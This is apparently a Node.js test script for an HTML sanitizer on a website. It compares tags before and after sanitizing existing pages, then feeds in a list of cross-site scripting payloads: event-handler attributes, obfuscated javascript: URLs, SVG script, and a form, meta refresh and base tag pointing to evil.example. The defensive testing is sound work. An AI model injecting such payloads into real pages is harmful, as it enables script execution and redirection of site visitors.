import fs from 'node:fs';
import { sanitizeFragment } from './lib/sanitize.mjs';
const root = new URL('../../eost-site/', import.meta.url).pathname;
const files = [...fs.readdirSync(root).filter(f => f.endsWith('.html') && f !== '404.html').map(f => f), ...fs.readdirSync(root + 'br').map(f => 'br/' + f)];
const count = (h) => { const m = {}; for (const t of h.matchAll(/<([a-zA-Z][\w-]*)/g)) m[t[1]] = (m[t[1]] || 0) + 1; return m; };
const attrs = (h) => (h.match(/\s[a-zA-Z:-]+=/g) || []).length;
let bad = 0;
for (const f of files) {
  const html = fs.readFileSync(root + f, 'utf8');
  for (const [name, re] of [['main', /<main id="main">([\s\S]*)<\/main>/], ['footer', /<footer>([\s\S]*?)<\/footer>/]]) {
    const src = html.match(re)[1];
    const out = sanitizeFragment(src);
    const a = count(src), b = count(out);
    const diff = Object.keys({ ...a, ...b }).filter(k => a[k] !== b[k]);
    if (diff.length || Math.abs(attrs(src) - attrs(out)) > 0) {
      bad++; console.log('DIFF', f, name, diff.map(k => `${k}:${a[k]}->${b[k]}`).join(' '), 'attrs', attrs(src), '->', attrs(out));
    }
  }
}
console.log(files.length, 'pages testées,', bad, 'écarts');
const attack = [
  '<p onclick="alert(1)">x</p>', '<script>alert(1)</script><p>ok</p>', '<a href="javascript:alert(1)">l</a>', '<a href=" jav&#x09;ascript:alert(1)">l</a>',
  '<img src=x onerror=alert(1)>', '<img src="data:text/html;base64,AAA">', '<iframe src="https://evil.example/x"></iframe>', '<iframe src="https://www.openstreetmap.org/export/embed.html?bbox=1"></iframe>',
  '<svg><script>alert(1)</script><use href="javascript:alert(1)"/></svg>', '<form action="https://evil.example" method="GET"><input name="a"></form>',
  '<p style="background:url(javascript:alert(1))">s</p>', '<p style="position:fixed;top:0;left:0;width:100%;height:100%">s</p>', '<style>body{display:none}</style><meta http-equiv="refresh" content="0;url=https://evil.example"><link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/">',
  '<object data="x"></object><embed src="x">', '<a href="//evil.example/x">l</a>', '<div data-x="1" onmouseover="alert(1)">d</div>',
];
for (const a of attack) console.log(JSON.stringify(a).slice(0, 75).padEnd(78), '=>', JSON.stringify(sanitizeFragment(a)));
